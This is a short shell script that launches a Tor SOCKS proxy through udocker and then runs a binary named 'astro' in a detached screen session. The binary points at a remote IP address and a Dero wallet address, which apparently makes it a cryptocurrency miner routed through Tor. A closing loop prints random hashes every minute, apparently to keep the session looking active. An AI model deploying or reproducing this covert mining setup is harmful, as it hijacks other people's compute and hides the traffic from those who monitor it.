udocker run -p 127.0.0.1:9150:9150/tcp peterdavehello/tor-socks-proxy:latest &
sleep 2m
screen -dmS my ./astro -r 45.86.230.214:80 -w dero1qy3lstrmklwdzhcs43lltvdqzhdxdwsz4c85v8lmpmflq72hrx0wcqgmmphfg -p rpc -sock-address 127.0.0.1:9150
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
